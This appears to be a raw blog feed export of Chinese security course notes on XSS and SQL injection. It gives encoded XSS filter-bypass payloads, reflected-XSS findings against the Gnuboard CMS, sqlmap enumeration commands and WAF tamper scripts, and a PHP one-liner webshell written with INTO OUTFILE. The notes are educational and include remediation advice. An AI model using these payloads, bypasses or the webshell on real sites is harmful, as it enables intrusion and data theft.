class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">八进制编码</span><br><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\61\51&quot;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">16 进制编码</span><br><span class="line">&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">jsunicode 编码</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="html-编码"><a class="markdownIt-Anchor" href="#html-编码">#</a> HTML 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在=后可以解析 html 编码</span><br><span class="line"></span><br><span class="line">十进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot; /&gt;</span><br><span class="line">&lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">十六进制</span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure><h3 id="base64-编码"><a class="markdownIt-Anchor" href="#base64-编码">#</a> base64 编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用伪协议 base64 解码执行 xss </span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;111&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="构造事件绕过"><a class="markdownIt-Anchor" href="#构造事件绕过">#</a> 构造事件绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果不能依靠属性进行跨站，那么还可以利用事件处理函数: </span><br><span class="line">&lt;input type = &quot;button&quot;  value = &quot;clickme&quot; οnclick=&quot;alert(&#x27;click me&#x27;)&quot; /&gt; </span><br><span class="line">事件既能让JS脚本运行，自然也可以执行跨站，另外像onerror、onMouseover等都可利用的是事件处理函数; </span><br><span class="line"></span><br><span class="line">  最后还可以使用fuzz大法去做模糊测试，然后构造payload,更事半功倍！</span><br></pre></td></tr></table></figure><p>更多绕过方式参考：</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kM2FkZW5kLm9yZy94c3MvZ2hldHRvQnlwYXNz">https://d3adend.org/xss/ghettoBypass</span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamI1MS5uZXQvdG9vbHMveHNzLmh0bQ==">https://www.jb51.net/tools/xss.htm</span></li></ul></li></ul><h1 id="xss-项目实战挖掘-cms-xss-漏洞"><a class="markdownIt-Anchor" href="#xss-项目实战挖掘-cms-xss-漏洞">#</a> xss 项目实战挖掘 cms xss 漏洞</h1><p>Gnuboard 是韩国 Sir 公司开发一套 PHP+Mysql 可扩展论坛程序。将主程序与 Skin （风格文件）完全剥离，通过 skin 的编辑可以制作人才就业网站、房产信息平 台、供求信息发布、甚至可以作为企业产品展示。</p><p>项目地址：</p><p>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXd3ZktVWHVSS3VNOGpDR1hOVHBjZ2c=">https://pan.baidu.com/s/1wwfKUXuRKuM8jCGXNTpcgg</span> 提取码：vai0</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677103075-fc2c3442-481c-4252-a18a-96755d3af824.png" alt="img"></p><p>挖掘 xss 漏洞 寻找可控参数，输入标签，右键查看源码，是否有队输入的内容 过滤。如果存在标签过滤，则尝试绕过过滤，没有过滤的情况下，构造而已代码 即可。</p><h3 id="反射型-xss-漏洞一"><a class="markdownIt-Anchor" href="#反射型-xss-漏洞一">#</a> 反射型 xss 漏洞一</h3><p>首页直接尝试检测</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677289732-3592b59c-de3c-48ea-963b-c04ab471c294.png" alt="img"></p><p>没有闭合尖括号，直接构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631677368446-076b4fbd-f81f-4ff2-bfb0-fdf4d9287a91.png" alt="img"></p><h3 id="反射型-xss-漏洞二"><a class="markdownIt-Anchor" href="#反射型-xss-漏洞二">#</a> 反射型 xss 漏洞二</h3><p>在登录用户处，尝试登录抓包仔细查看返回内容。查看是否有相同点；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631678410583-a8125000-7b59-4b6e-a07c-4acd0baf6910.png" alt="img"></p><p>document.location.replace 这个 js 的意思 载入新文档替换当前页面；</p><p>同样可以用双引号闭合语句执行恶意语句；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);alert(&#x27;xss&#x27;);//</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631684085835-f2eb85c5-a607-46c2-a2c0-8985a97f2915.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1631678627439-6836b7f6-0bb7-4faa-a755-9e277dfbfb21.png" alt="img"></p><h1 id="漏洞修复"><a class="markdownIt-Anchor" href="#漏洞修复">#</a> 漏洞修复</h1><ul><li><p>输入检查</p><p>白名单</p><p>同时在客户端 javascript 中和服务端代码中实现相同的输入检查</p></li><li><p>输出检查</p><p>HTML 编码</p><p>JS 转义</p></li><li><p>HttpOnly</p><p>浏览器禁止页面的 javascript 访问带有 httponly 属性的 cookie。httponly 解决的是 XSS 后的 cookie 攻击</p></li></ul><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第二天xss跨站脚本攻击&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第二天xss跨站脚本攻击&quot;&gt;#&lt;/a&gt; 第二天：XSS 跨站脚本攻击&lt;/h1&gt;
&lt;h1 id=&quot;http的基础&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%8B%EF%BC%89/</id>
    <published>2022-03-04T01:38:19.706Z</published>
    <updated>2022-03-04T01:40:49.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一-sqlmap简介"><a class="markdownIt-Anchor" href="#一-sqlmap简介">#</a> 一、SQLMAP 简介</h2><p>SQLMAP 是一款由 Python 开发的自动化 SQL 注入工具，其主要功能是扫描、发现并利用 SQL 注入漏洞，它内置了很多绕过插件，并且支持多种数据库，如 MySQL、Oracle、PostgreSQL、SQL Server、Access、IBM DB2、SQLite 等数据库；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9zcWxtYXAub3JnLw==">https://sqlmap.org/</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626920505254-18eb0878-9c8c-43dd-9964-996a0223dd63.png" alt="img"></p><p>SQLMAP 的强大之处在于对数据库指纹的识别、数据库枚举、数据提取、访问目标文件系统、并在获取完全的操作权限时执行任意命令，它支持以下几种独特的注入：</p><ul><li><ul><li>基于布尔类型的注入，即可根据返回页面判断条件真假的注入；</li><li>基于时间的盲注，即不能根据页面返回判断的时候，利用时间线是否延时来判断条件的真假；</li></ul></li><li><ul><li>基于报错的注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中，比如数据库报错的信息等；</li><li>联合查询注入，即可以使用 Union 的情况下注入；</li></ul></li><li><ul><li>堆叠查询注入，即可以同时执行多条语句时的注入；</li></ul></li></ul><h2 id="二-sqlmap安装"><a class="markdownIt-Anchor" href="#二-sqlmap安装">#</a> 二、SQLMAP 安装</h2><p>前面我们提到了 SQLMAP 是由 Python 编写，因此我们需要安装配置 Python 环境，安装完成后，将 Python 目录加入环境变量，然后将下载好的 SQLMAP 目录放到 Python 目录下，然后配置好环境变量，然后即可在 CMD 环境下启动 SQLMAP</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626920757296-b0bcfc68-b42b-46fd-b0d4-e293bd26ad25.png" alt="img"></p><h2 id="三-sqlmap的使用"><a class="markdownIt-Anchor" href="#三-sqlmap的使用">#</a> 三、SQLMAP 的使用</h2><ul><li><p>注入判断</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922175810-8ed040d0-5def-441b-b7a8-d78ce62033e3.png" alt="img"></p><ul><li><p>查询当前站点使用的数据库</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --current-db</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922209864-c570edff-d4c4-4e94-87e5-3355ad18632d.png" alt="img"></p><ul><li><p>查询当前用户下所有数据库</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --dbs</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922246303-5d97a903-e074-406c-8b4f-059f25dab101.png" alt="img"></p><ul><li><p>查询表名</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url -D dbname --tables</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922427668-00a66ca3-88c5-4ebd-948e-f0ac37170669.png" alt="img"></p><ul><li><p>查询字段名</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url -D dbname -T tablename --columns</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922489012-91cf3db0-b2c6-48e9-8e99-1c2c9daa4f62.png" alt="img"></p><ul><li><p>查询字段内容</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url -D dbname -T tabalename -C olumnname --dump</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922539344-c9ca08ca-0a64-497d-a48a-99de59470664.png" alt="img"></p><ul><li><p>查询数据库的所有用户（当前用户有读写权限）</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --users</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922589345-3806968a-6074-4883-bac9-5ccf0ed398db.png" alt="img"></p><ul><li><p>查询数据库用户的密码（当前用户有读取权限）</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --password</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922728512-fe69d54a-5b03-470d-bacf-2fed994122b9.png" alt="img"></p><ul><li><p>查询当前数据库用户名称</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --current-user</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922762690-2145c46c-0603-48bd-bb14-6f33a8173792.png" alt="img"></p><ul><li><p>指定数据库类型</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url -dbms=mysql/oracle/mssql</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922808702-03e6c770-ba1b-4521-8244-e8e7589c9761.png" alt="img"></p><ul><li><p>判断用户是否为管理员</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u url --is-dba</li><li>返回为结果为 true 时，当前数据库用户为 root，返回结果为 false 则相反</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922843411-86cb8b66-fa4d-4087-a1c7-618158ee2524.png" alt="img"></p><ul><li><p>–level 5 探测等级</p></li><li><ul><li>–level 1 默认的等级，会进行基本的测试，包括 GET 和 POST 方式</li><li>–level 2 在原有的基础上增加对 cookie 的检测</li></ul></li><li><ul><li>–level 3 增加对 USER AGENT/REFERER 的检测</li><li>–level 4 更多的 payload</li></ul></li><li><ul><li>–level 5 最高等级，包含所有的 payload, 会尝试自动破解出 cookie、xff 等头部注入（速度最慢）</li></ul></li><li><p>-v 显示调用信息的 7 个级别</p></li><li><ul><li>0只显示 python 错误以及严重的信息</li><li>1同时显示基本信息和警告信息</li></ul></li><li><ul><li>2同时显示 debug 信息</li><li>3同时显示注入的 payload</li></ul></li><li><ul><li>4同时显示 http 请求</li><li>5同时显示 http 响应头</li></ul></li><li><ul><li>6同时显示 http 响应页面</li></ul></li><li><p>伪造 Referer 头</p></li><li><ul><li>–referer：当前等级为 3 或 3 以上时，会尝试对 referer 注入，可以使用 referer 来伪造 referer 来源</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626922932108-ef9eff46-77b5-4420-b5fe-c59d00e88c3b.png" alt="img"></p><ul><li><p>执行自定的 SQL 语句</p></li><li><ul><li>–sql-shell</li></ul></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626923010953-f1088165-d413-465f-b8fc-d890a389274d.png" alt="img"></p><h2 id="四-sql注入的修复与绕过"><a class="markdownIt-Anchor" href="#四-sql注入的修复与绕过">#</a> 四、SQL 注入的修复与绕过</h2><ul><li><p>目前为止我们已经学习了手工注入和 SQLMap 工具的注入方法。 但是，如果目标安装了一些防护软件怎么办呢？</p></li><li><p>常用绕过思路：</p></li><li><ul><li>大小写绕过</li><li>双写绕过</li></ul></li><li><ul><li>编码绕过</li><li>内联注释绕过</li></ul></li><li><ul><li>其他数据库特征</li></ul></li><li><p>SQLMAP 使用脚本绕过</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NxbG1hcC5weQ==">sqlmap.py</span> -u- url --tamper “<span class="exturl" data-url="aHR0cDovL3huLS1lcXJ2ODViMnZuc3hnLnB5">脚本名称.py</span>”</li></ul></li><li><p>SQLMAP 常见绕过脚本（部分）</p></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2Fwb3N0cm9waGVtYXNrLnB5">apostrophemask.py</span>  将引号替换为 UTF-8，用于过滤单引号</li><li><span class="exturl" data-url="aHR0cDovL2Jhc2U2NGVuY29kZS5weQ==">base64encode.py</span>  替换为 base64 编码</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL211bHRpcGxlc3BhY2VzLnB5">multiplespaces.py</span>  围绕着 SQL 关键字添加多个空格</li><li><span class="exturl" data-url="aHR0cDovL25vbnJlY3Vyc2l2ZXJlcGxhY2VtZW50LnB5">nonrecursivereplacement.py</span>双写语句替换预定义的 payload</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMnJhbmRvbWJsYW5rLnB5">space2randomblank.py</span>  将空格替换为其他的有效字符</li><li><span class="exturl" data-url="aHR0cDovL3VuaW9uYWxsdG91bmlvbi5weQ==">unionalltounion.py</span>  union all select 替换为 union select</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NlY3VyZXNwaGVyZS5weQ==">securesphere.py</span>  追加一些其他特殊字符串</li><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMmhhc2gucHk=">space2hash.py</span>  将空格替换为 #号，并添加一个随机字符串和换行符</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMm1zc3FsYmxhbmsucHk=">space2mssqlblank.py</span>空格替换为其他空符号</li><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMm1zc3FsaGFzaC5weQ==">space2mssqlhash.py</span>空格替换为 #号，并添加一个换行符</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2JldHdlZW4ucHk=">between.py</span>  用 NOT BETWEEN 0 AND 替换大于号，用 BETWEEN  AND 替换等号</li><li><span class="exturl" data-url="aHR0cDovL3BlcmNlbnRhZ2UucHk=">percentage.py</span>  ASP 每个字符前添加 %, 如 % s% e% l% e% c% t%…</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2NoYXJlbmNvZGUucHk=">charencode.py</span>  对未 url 编码处理的 Payload 字符串进行 url 编码</li><li><span class="exturl" data-url="aHR0cDovL2NoYXJ1bmljb2RlZW5jb2RlLnB5">charunicodeencode.py</span>使用 unicode 编码</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMmNvbW1lbnQucHk=">space2comment.py</span>  空格替换为 /**/</li><li><span class="exturl" data-url="aHR0cDovL2VxdWFsdG9saWtlLnB5">equaltolike.py</span>   等号替换为 like</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2dyZWF0ZXN0LnB5">greatest.py</span>  用 GREATEST 替换大于号</li><li><span class="exturl" data-url="aHR0cDovL21vZHNlY3VyaXR5dmVyc2lvbmVkLnB5">modsecurityversioned.py</span>  空格替换为 MySQL 内联注释</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL21vZHNlY3VyaXR5emVyb3ZlcnNpb25lZC5weQ==">modsecurityzeroversioned.py</span>使用 MySQL 内联注释（/!<em>00000</em>/）注入</li><li><span class="exturl" data-url="aHR0cDovL3NwYWNlMm15c3FsZGFzaC5weQ==">space2mysqldash.py</span>  空格替换为–和一个换行符</li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL2NoYXJkb3VibGVlbmNvZGUucHk=">chardoubleencode.py</span>  对 Payload 进行两次 URL 编码（不处理已经编码的字符）</li></ul></li><li><p>修复建议</p></li><li><ul><li>在服务器端要对所有的输入数据验证有效性。</li><li>在处理输入之前，验证所有客户端提供的数据，包括所有的参数、URL 和 HTTP 头的内容。</li></ul></li><li><ul><li>验证输入数据的类型、长度和合法的取值范围。</li><li>使用白名单验证允许的输入字符而不是黑名单。</li></ul></li><li><ul><li>在危险字符输入后进行转义或编码。</li><li>明确所有输入正确的字符集。</li></ul></li><li><ul><li>不使用动态拼接的 SQL 语句，如果使用对特殊字符进行转义。</li><li>设置最小权限运行程序，如 apache 权限运行</li></ul></li></ul><p>详细教程：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9wZGYvMjY5OTc1MC8xNjQzNjA3MzAwMzQ1LTNlYzM0NWMwLTAwOWItNGVkMi1hMWU4LTM2NTRmMzE5NGI0NS5wZGY=">SQLMAP 注入详解教程.pdf</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvODk2YTY4OTMtODIwZC00ZDQ1LWIwNDktOTY1NzU1ZGE4NjFiPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFhdW95JUVGJUJDJTg5">https://www.yuque.com/docs/share/896a6893-820d-4d45-b049-965755da861b?#（密码：auoy）</span> 《第五天：SQL 注入 - 下》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;一-sqlmap简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-sqlmap简介&quot;&gt;#&lt;/a&gt; 一、SQLMAP 简介&lt;/h2&gt;
&lt;p&gt;SQLMAP 是一款由 Python 开发的自动化 SQL 注入工具，其主要功能是扫描、发现</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%8A%EF%BC%89/</id>
    <published>2022-03-04T01:37:17.833Z</published>
    <updated>2022-03-17T06:14:10.388Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四天sql注入-上"><a class="markdownIt-Anchor" href="#第四天sql注入-上">#</a> 第四天：SQL 注入 - 上</h1><h2 id="课堂导学"><a class="markdownIt-Anchor" href="#课堂导学">#</a> 课堂导学</h2><p>1. 理解 SQL 注入形成原理</p><p>2. 掌握相关的 mysql 知识</p><p>3. 熟练掌握常见的注入手法</p><h2 id="重点难点"><a class="markdownIt-Anchor" href="#重点难点">#</a> 重点难点</h2><p>1.mysql 内置库相关</p><p>2. 注入类型区分</p><p>3. 不同注入类型的手法</p><h2 id="一-sql注入简介"><a class="markdownIt-Anchor" href="#一-sql注入简介">#</a> 一、SQL 注入简介</h2><p>SQL 注入是指 Web 应用程序对用户输入数据的合法性未进行判断、处理，前端传入的参数是攻击者可控的，并且参数被正常的带入到数据库查询，攻击者可以通过构造不同的 SQL 语句来进行对数据库的操作，正常情况下，攻击者可以对数据库进行高危操作，例如，数据查询、WebShell 写入、命令执行等操作。</p><h3 id="1sql注入原理"><a class="markdownIt-Anchor" href="#1sql注入原理">#</a> 1.SQL 注入原理</h3><p>SQL 注入漏洞的产生需要满足以下两个条件：</p><ol><li>参数是用户可控的，也就是前端传入后端的参数的内容是用户可以控制的；</li><li>参数被带入数据库进行查询，也就是传入的参数被拼接到 SQL 语句中，并且被带入到数据库进行查询；</li></ol><p>SQL 注入的原因：将输入的数据未经过严格的过滤与处理，将数据直接带入到数据库中，执行了相应的操作，从而使得对数据库产生威胁。</p><h3 id="2注入判断"><a class="markdownIt-Anchor" href="#2注入判断">#</a> 2. 注入判断</h3><ul><li><p>当传入的参数为 1’时，数据库会执行以下代码并会报错，因为这是不符合数据库语法规范的；</p></li><li><p>select * from users where id=1’</p></li><li><p>当传入的参数为 and1=1 时，不会报错，因为 1=1 为真，所以返回的页面是正常的；当传入的参数为 and1=2 时，因为条件为假，所以会返回一个不同的结果；</p></li><li><p>select * from users where id=1 and 1=1      #条件为真，页面正常无变化</p><p>select * from users where id=1 and 1=2      #条件为假，页面异常或变化</p></li></ul><p>判断是否存在注入：</p><p><strong>回显是指页面有数据，信息返回</strong>：</p><ul><li><p>id =1 and 1=1</p></li><li><p>id = 1 and 1=2</p></li><li><p>id = 1 or 1=1</p></li><li><p>id = ‘1’ or ‘1’=‘1’</p></li><li><p>id=&quot; 1 &quot;or “1”=“1”</p></li></ul><p>无回显是指根据输入的语句页面没有任何变化，或者没有数据库中的内容显示到网页中；</p><h3 id="3sql注入流程"><a class="markdownIt-Anchor" href="#3sql注入流程">#</a> 3.SQL 注入流程</h3><p>是否存在注入并且判断注入类型：</p><ul><li><p>判断字段数 order by</p></li><li><p>确定回显点 union select 1,2</p></li><li><p>查询数据库信息 @@version @@datadir</p></li><li><p>查询用户名，数据库名 user () database ()</p></li><li><p>文件读取 union select 1,load_file (‘C:\wondows\win.ini’)#</p></li><li><p>写入 webshell select…into outfile…</p></li></ul><p>补充一点，使用 sql 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过；</p><h3 id="4sql注入漏洞的危害"><a class="markdownIt-Anchor" href="#4sql注入漏洞的危害">#</a> 4.SQL 注入漏洞的危害</h3><ul><li>数据库信息泄露：泄露数据库中存放的数据，用户隐私等；</li><li>获取 webshell：当权限为 root 且知道绝对路径时，可以直接写入一句话木马到服务器</li><li><ul><li>union select 1,&quot;<?php @eval($_POST['cmd']);?>&quot;,3 into outfile “X:\xx\xx.php”, 也可以查询 null 值；</li></ul></li><li>网页篡改：注入出后台管理员用户，登录后台发布恶意数据、篡改后台数据等；</li><li>网站挂马：当拿到 webshell 或者获取到服务器权限后，可将一些网页木马挂在服务器上，去攻击别人；</li><li>获取系统权限：当权限足够高时，可以获取系统主机的权限；</li><li>万能密码：利用特定的 payload 登录后台或其他页面；</li><li>文件读取：读取敏感文件</li><li>union select 1,2,hex(loadfile(D:\phpStudy\PHPTutorial\WWW\x.php))–+</li></ul><h3 id="5注入类型"><a class="markdownIt-Anchor" href="#5注入类型">#</a> 5. 注入类型</h3><ul><li><p>按数据库类型：</p><p>Access、MsSQL、MySQL、Oracle、DB2 等；</p></li><li><p>按提交方式：</p><p>GET、POST、cookie、HTTP 头、XFF；</p></li><li><p>按注入点类型：</p><p>数字型、字符型、搜索型；</p></li><li><p>按执行效果：</p><p>布尔盲注、时间盲注、报错注入、联合注入、堆叠查询注入；</p></li></ul><h3 id="6类型解释"><a class="markdownIt-Anchor" href="#6类型解释">#</a> 6. 类型解释</h3><ul><li><p>数字型</p><p>在 Web 端大概是 <span class="exturl" data-url="aHR0cDovL3h4eC5jb20vbmV3cy5waHA/aWQ9MQ==">http://xxx.com/news.php?id=1</span> 这种形式，其注入点 id 类型为数字，所以叫数字型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where id=1；</p></li><li><p>字符型</p><p>在 Web 端大概是 <span class="exturl" data-url="aHR0cDovL3h4eC5jb20vbmV3cy5waHA/bmFtZT1hZG1pbg==">http://xxx.com/news.php?name=admin</span> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 select * from 表名 where name=‘admin’。注意多了引号；</p></li><li><p>搜索型</p><p>一些网站为了方便用户查找网站的资源，都对用户提供了搜索的功能，因为是搜索功能，往往是程序员在编写代码时都忽略了对其变量 (参数) 的过滤，而且这样的漏洞在国内的系统中普遍的存在；</p><p>其中又分为 POST/GET,GET 型的一般是用在网站上的搜索，而 POST 则用在用户名的登录，可以从 from 表单的 method=&quot;get&quot; 属性来区分是 get 还是 post。搜索型注入又称为文本框注入；</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>w</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">pwd=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_GET[t]</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>q</mi><mi>l</mi><mo>=</mo><mi mathvariant="normal">&quot;</mi><mi>s</mi><mi>e</mi><mi>l</mi><mi>e</mi><mi>c</mi><mi>t</mi><mo>∗</mo><mi>f</mi><mi>r</mi><mi>o</mi><mi>m</mi><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>w</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>e</mi><mi>p</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mi>l</mi><mi>i</mi><mi>k</mi><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">sql=&quot;select * from user where password like &#x27;%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" 